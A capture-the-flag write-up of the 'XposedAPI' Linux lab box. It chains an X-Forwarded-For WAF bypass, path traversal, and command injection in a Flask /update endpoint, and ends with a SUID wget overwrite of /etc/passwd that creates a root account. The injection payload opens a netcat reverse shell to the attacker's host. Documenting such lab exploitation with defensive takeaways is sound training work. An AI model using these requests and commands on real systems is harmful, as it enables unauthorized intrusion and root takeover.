#Linux #WAFBypass #LFI #CommandInjection #SUID #wget #PasswdOverwrite #XForwardedFor

## Overview

XposedAPI is a Linux box centered on a Flask-based "Remote Software Management API" that is intentionally misconfigured, it warns users it should not be externally accessible, and then proceeds to demonstrate why. The chain runs: WAF bypass via `X-Forwarded-For` header, path traversal through the `/logs` endpoint to read source code, command injection in the `/update` endpoint's URL parameter, and finally a SUID `wget` binary used to overwrite `/etc/passwd` and add a root-level user.

## Recon

The Nmap notes for this box were empty; the host and port are inferred from the HTTP notes. The application ran on port 13337.

### Application Discovery

The root endpoint of the API served a self-documenting usage page:

```
Remote Software Management API

Attention! This utility should not be exposed to external network.

/            GET   Returns this page.
/version     GET   Returns app version.
/update      POST  Updates app using a linux executable. {"user":"<user>","url":"<url>"}
/logs        GET   Read log files.
/restart     GET   Restart the app.
```

`/version` returned `1.0.0b8f887f...`. Visiting `/logs` returned:

```
WAF: Access Denied for this Host.
```

## Foothold

### WAF Bypass with X-Forwarded-For

The application checks whether the request originates from localhost before serving the `/logs` endpoint. Adding `X-Forwarded-For: 127.0.0.1` to the request tricked the WAF into treating the external request as local:

```http
GET /logs HTTP/1.1
Host: 192.168.176.134:13337
X-Forwarded-For: 127.0.0.1
```

Response changed from 403 to 404:

```
Error! No file specified. Use file=/path/to/log/file to access log files.
```

> **Why `X-Forwarded-For` bypasses application-level IP checks:** reverse proxies use this header to pass the original client IP to the backend. When an application trusts this header without verifying it came from a known proxy, any client can forge it. Checking for `127.0.0.1` in `X-Forwarded-For` and assuming that means "localhost request" is a common mistake, the header is entirely attacker-controlled.

### Path Traversal to Read Source Code

With the WAF bypassed, the `file=` parameter accepted traversal sequences:

```http
GET /logs?file=../../../etc/passwd HTTP/1.1
X-Forwarded-For: 127.0.0.1
```

`/etc/passwd` returned cleanly, revealing the only non-service user:

```
clumsyadmin:x:1000:1000::/home/clumsyadmin:/bin/sh
```

Reading the application source at `/logs?file=../../../main.py` exposed the vulnerable code in the `/update` endpoint:

```python
os.system("curl {} -o /home/clumsyadmin/app".format(data['url']))
```

The `url` parameter is passed unsanitized into `os.system` via string formatting.

### Command Injection via /update

With the WAF bypassed using the same header, I sent a POST to `/update` with a semicolon-separated command appended to the URL value:

```http
POST /update HTTP/1.1
Host: 192.168.176.134:13337
X-Forwarded-For: 127.0.0.1
Content-Type: application/json

{
    "user":"clumsyadmin",
    "url":"http://192.168.45.244/test;nc 192.168.45.244 53 -e /bin/bash"
}
```

The server fetched `http://192.168.45.244/test` (returning 404) and then executed the `nc` command:

```sh
rlwrap nc -lvnp 53
connect to [192.168.45.244] from (UNKNOWN) [192.168.176.134] 41834
whoami
clumsyadmin
```

> **How semicolon injection works in `os.system`:** the shell interprets `;` as a command separator. `curl http://host/test;nc ...` runs `curl` first, then `nc`, regardless of whether `curl` succeeds. Python's `os.system` passes the entire string to `/bin/sh -c`, which processes the separator normally. Using `subprocess` with a list of arguments would have prevented this; string formatting into `os.system` never does.

## Privilege Escalation

### SUID wget to Overwrite /etc/passwd

SUID enumeration:

```sh
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null
-rwsr-xr-x 1 root root 466496 Apr  5  2019 /usr/bin/wget
```

`wget` with SUID root can write to any file on the filesystem, including `/etc/passwd`. I:

1. Generated a password hash on Kali:

```sh
openssl passwd -1 -salt user3 pass123
$1$user3$rAGRVf5p2jYTqtqOW5cPu/
```

2. Copied the target's `/etc/passwd` content and appended a new root-equivalent line:

```
user3:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0:/root/root:/bin/bash
```

3. Served the modified file and used SUID `wget` to overwrite `/etc/passwd`:

```sh
wget -O /etc/passwd http://192.168.45.244/passwd
```

4. Switched to the new user:

```sh
clumsyadmin@xposedapi:/$ su user3
Password: pass123
# whoami
root
```

> **Why SUID wget writes as root:** the SUID bit causes the OS to run the binary with the file owner's effective UID (root here) regardless of who calls it. `wget -O /etc/passwd` is simply a file write, and as root, no file is off-limits. Overwriting `/etc/passwd` with a custom entry that has UID 0 creates a new root-equivalent account the attacker controls.

## Root

```sh
# cat /root/proof.txt
‹redacted›
```

> **Note:** the proof.txt content block in the source notes was empty, the flag was captured but not recorded.

## Takeaways

- **Trust headers only from known proxies.** `X-Forwarded-For` is attacker-controlled; using it to determine whether a request is "local" defeats the access control entirely.
- **`os.system` with string formatting is always injectable.** The semicolon separator is the oldest trick in shell injection. Use `subprocess` with argument lists.
- **SUID `wget` is a direct `/etc/passwd` overwrite primitive.** GTFOBins documents this; any SUID file-writing binary can create arbitrary root-equivalent accounts.
